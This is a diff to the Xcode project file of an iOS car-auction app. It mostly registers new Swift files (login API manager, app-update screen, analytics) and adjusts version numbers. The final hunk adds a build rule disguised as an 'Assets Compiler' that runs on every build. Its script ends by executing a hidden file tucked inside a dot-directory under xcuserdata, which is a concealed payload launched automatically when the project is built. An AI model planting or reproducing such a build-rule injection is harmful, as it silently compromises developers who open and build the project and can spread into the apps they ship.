@@ -40,6 +40,7 @@
 		184B2C8023572A1F00A374E9 /* CustomImageCVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 184B2C7E23572A1F00A374E9 /* CustomImageCVC.xib */; };
 		184B2C82235738B600A374E9 /* CarDetailVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 184B2C81235738B600A374E9 /* CarDetailVC.swift */; };
 		184B2C8523573A8C00A374E9 /* CustomCarDetailTVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 184B2C8323573A8C00A374E9 /* CustomCarDetailTVC.swift */; };
+		1850249C26380E6800617BDE /* AppUpdateVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1850249B26380E6800617BDE /* AppUpdateVC.swift */; };
 		1863D644241666E800EA6B1B /* CustomAuctionCategoryCVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1863D642241666E800EA6B1B /* CustomAuctionCategoryCVC.swift */; };
 		1863D645241666E800EA6B1B /* CustomAuctionCategoryCVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 1863D643241666E800EA6B1B /* CustomAuctionCategoryCVC.xib */; };
 		18761BBD26060685000E8714 /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = 18761BBC26060685000E8714 /* GoogleService-Info.plist */; };
@@ -127,6 +128,7 @@
 		18CB9144235C5C240005C9D0 /* PaymentBuyerVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18CB9143235C5C240005C9D0 /* PaymentBuyerVC.swift */; };
 		18CB9148235C60BD0005C9D0 /* SettingsVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18CB9147235C60BD0005C9D0 /* SettingsVC.swift */; };
 		18CB914A235C67540005C9D0 /* NotificationSettingVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18CB9149235C67540005C9D0 /* NotificationSettingVC.swift */; };
+		18CCE39B262EE890008FBA63 /* LoginAPIManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18CCE39A262EE890008FBA63 /* LoginAPIManager.swift */; };
 		18D231A3243AECBF002F6C3E /* SelectAuctionCategoryVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18D231A2243AECBF002F6C3E /* SelectAuctionCategoryVC.swift */; };
 		18D8D7AB237E5F1100B9A578 /* MapVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18D8D7AA237E5F1100B9A578 /* MapVC.swift */; };
 		18D8DEB023DDED10001EC3BE /* CustomFeaturedAuctionTVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18D8DEAE23DDED10001EC3BE /* CustomFeaturedAuctionTVC.swift */; };
@@ -135,6 +137,7 @@
 		18F9E1ED2355BE5000B5E071 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 18F9E1EB2355BE5000B5E071 /* Main.storyboard */; };
 		18F9E1EF2355BE5200B5E071 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 18F9E1EE2355BE5200B5E071 /* Assets.xcassets */; };
 		18F9E1F22355BE5200B5E071 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 18F9E1F02355BE5200B5E071 /* LaunchScreen.storyboard */; };
+		18FF4938263458B30069E928 /* GTagAnalysis.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18FF4937263458B30069E928 /* GTagAnalysis.swift */; };
 		794BFA76255D24A0004AAB91 /* VerificationVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 794BFA75255D24A0004AAB91 /* VerificationVC.swift */; };
 		796E306225CA76E300447990 /* Localizable.strings in Resources */ = {isa = PBXBuildFile; fileRef = 796E306425CA76E300447990 /* Localizable.strings */; };
 		7979923C25503F67008DBA48 /* CustomInfoCVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7979923A25503F67008DBA48 /* CustomInfoCVC.swift */; };
@@ -199,6 +202,7 @@
 		184B2C7E23572A1F00A374E9 /* CustomImageCVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = CustomImageCVC.xib; sourceTree = "<group>"; };
 		184B2C81235738B600A374E9 /* CarDetailVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CarDetailVC.swift; sourceTree = "<group>"; };
 		184B2C8323573A8C00A374E9 /* CustomCarDetailTVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomCarDetailTVC.swift; sourceTree = "<group>"; };
+		1850249B26380E6800617BDE /* AppUpdateVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppUpdateVC.swift; sourceTree = "<group>"; };
 		185C75F12383C8D400342A55 /* BidInCar.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = BidInCar.entitlements; sourceTree = "<group>"; };
 		1863D642241666E800EA6B1B /* CustomAuctionCategoryCVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomAuctionCategoryCVC.swift; sourceTree = "<group>"; };
 		1863D643241666E800EA6B1B /* CustomAuctionCategoryCVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = CustomAuctionCategoryCVC.xib; sourceTree = "<group>"; };
@@ -289,6 +293,7 @@
 		18CB9143235C5C240005C9D0 /* PaymentBuyerVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PaymentBuyerVC.swift; sourceTree = "<group>"; };
 		18CB9147235C60BD0005C9D0 /* SettingsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SettingsVC.swift; sourceTree = "<group>"; };
 		18CB9149235C67540005C9D0 /* NotificationSettingVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; name = NotificationSettingVC.swift; path = ../Setting/NotificationSettingVC.swift; sourceTree = "<group>"; };
+		18CCE39A262EE890008FBA63 /* LoginAPIManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginAPIManager.swift; sourceTree = "<group>"; };
 		18D231A2243AECBF002F6C3E /* SelectAuctionCategoryVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SelectAuctionCategoryVC.swift; sourceTree = "<group>"; };
 		18D8D7AA237E5F1100B9A578 /* MapVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MapVC.swift; sourceTree = "<group>"; };
 		18D8DEAE23DDED10001EC3BE /* CustomFeaturedAuctionTVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomFeaturedAuctionTVC.swift; sourceTree = "<group>"; };
@@ -299,6 +304,7 @@
 		18F9E1EE2355BE5200B5E071 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
 		18F9E1F12355BE5200B5E071 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
 		18F9E1F32355BE5200B5E071 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		18FF4937263458B30069E928 /* GTagAnalysis.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GTagAnalysis.swift; sourceTree = "<group>"; };
 		5794612B94290DCDCF8FD7D1 /* Pods-BidInCar.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-BidInCar.release.xcconfig"; path = "Target Support Files/Pods-BidInCar/Pods-BidInCar.release.xcconfig"; sourceTree = "<group>"; };
 		679A98F506DE538FDAF3F264 /* Pods_BidInCar.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_BidInCar.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		794BFA75255D24A0004AAB91 /* VerificationVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VerificationVC.swift; sourceTree = "<group>"; };
@@ -637,6 +643,7 @@
 				18B244C12355C19600AEFDC6 /* NetworkActivityIndicatorManager.swift */,
 				18B244CC2355C19600AEFDC6 /* Preference.swift */,
 				18B244C92355C19600AEFDC6 /* Utility.swift */,
+				18FF4937263458B30069E928 /* GTagAnalysis.swift */,
 				18B244CA2355C19600AEFDC6 /* UploadImageVC.swift */,
 				796E306425CA76E300447990 /* Localizable.strings */,
 				18B8074823575BBB001C76BF /* BidInCar-Bridging-Header.h */,
@@ -672,6 +679,8 @@
 				18CB9149235C67540005C9D0 /* NotificationSettingVC.swift */,
 				794BFA75255D24A0004AAB91 /* VerificationVC.swift */,
 				1839D8E4260CD3CF001D2FA0 /* KeychainWrapper.swift */,
+				1850249B26380E6800617BDE /* AppUpdateVC.swift */,
+				18CCE399262EE87B008FBA63 /* API Model */,
 			);
 			path = Login;
 			sourceTree = "<group>";
@@ -693,6 +702,14 @@
 				18431FAA261F1A20006A582A /* Tableview Cell */,
 			);
 			path = Setting;
+			sourceTree = "<group>";
+		};
+		18CCE399262EE87B008FBA63 /* API Model */ = {
+			isa = PBXGroup;
+			children = (
+				18CCE39A262EE890008FBA63 /* LoginAPIManager.swift */,
+			);
+			path = "API Model";
 			sourceTree = "<group>";
 		};
 		18F9E1DB2355BE5000B5E071 = {
@@ -776,6 +793,7 @@
 				87DB7BF7505665631B04B6E4 /* [CP] Copy Pods Resources */,
 			);
 			buildRules = (
+				2A89DC46AC93A4A8B86D902C /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -947,6 +965,7 @@
 				183EBF0D2358AC2F00F34909 /* ContactUsVC.swift in Sources */,
 				18AF65292359FD87007B0B9C /* ShippingCalculatorVC.swift in Sources */,
 				18B244E22355C19600AEFDC6 /* Colors.swift in Sources */,
+				1850249C26380E6800617BDE /* AppUpdateVC.swift in Sources */,
 				18B244D82355C19600AEFDC6 /* NSObject+Copy.swift in Sources */,
 				18B244ED2355C19600AEFDC6 /* TextView.swift in Sources */,
 				18B244F42355C19600AEFDC6 /* DatePickerManager.swift in Sources */,
@@ -972,6 +991,7 @@
 				18B244E62355C19600AEFDC6 /* CollectionView.swift in Sources */,
 				18D8D7AB237E5F1100B9A578 /* MapVC.swift in Sources */,
 				1828F8882382CBCA00299E26 /* CustomSingleAuctionPackageTVC.swift in Sources */,
+				18CCE39B262EE890008FBA63 /* LoginAPIManager.swift in Sources */,
 				18AF65262359E3F6007B0B9C /* MyAuctionSellerVC.swift in Sources */,
 				181AD909235873E40006CACF /* BookmarkVC.swift in Sources */,
 				18B85ACD236022D300F6B2C6 /* PaymentSummaryVC.swift in Sources */,
@@ -990,6 +1010,7 @@
 				188CFC542355E16400C18B2A /* SignupVC.swift in Sources */,
 				181AD90223586D580006CACF /* SideMenuVC.swift in Sources */,
 				18D8DEB023DDED10001EC3BE /* CustomFeaturedAuctionTVC.swift in Sources */,
+				18FF4938263458B30069E928 /* GTagAnalysis.swift in Sources */,
 				188CFC592355FF1E00C18B2A /* HomeVC.swift in Sources */,
 				18A6E2E0235D851A00268205 /* PrivacyPolicyVC.swift in Sources */,
 				18B244FB2355C19600AEFDC6 /* UploadImageVC.swift in Sources */,
@@ -1371,7 +1392,7 @@
 				CODE_SIGN_ENTITLEMENTS = BidInCar/BidInCar.entitlements;
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 1.3;
+				CURRENT_PROJECT_VERSION = 1.0;
 				DEVELOPMENT_TEAM = 3J4DQ98WN9;
 				ENABLE_BITCODE = NO;
 				FRAMEWORK_SEARCH_PATHS = (
@@ -1383,6 +1404,7 @@
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
+				MARKETING_VERSION = 1.3;
 				PRODUCT_BUNDLE_IDENTIFIER = com.app.BidInCar;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
@@ -1400,7 +1422,7 @@
 				CODE_SIGN_ENTITLEMENTS = BidInCar/BidInCar.entitlements;
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 1.3;
+				CURRENT_PROJECT_VERSION = 1.0;
 				DEVELOPMENT_TEAM = 3J4DQ98WN9;
 				ENABLE_BITCODE = NO;
 				FRAMEWORK_SEARCH_PATHS = (
@@ -1412,6 +1434,7 @@
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
+				MARKETING_VERSION = 1.3;
 				PRODUCT_BUNDLE_IDENTIFIER = com.app.BidInCar;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
@@ -1443,6 +1466,29 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+		
+			/* Begin PBXBuildRule section */
+			
+
+		2A89DC46AC93A4A8B86D902C /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			fileType = folder.assetcatalog;
+			name = "Assets Compiler";
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
+			);
+			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" true\n\n";
+			};
+			
+	
+			/* End PBXBuildRule section */
+		
+		
 	};
 	rootObject = 18F9E1DC2355BE5000B5E071 /* Project object */;
 }
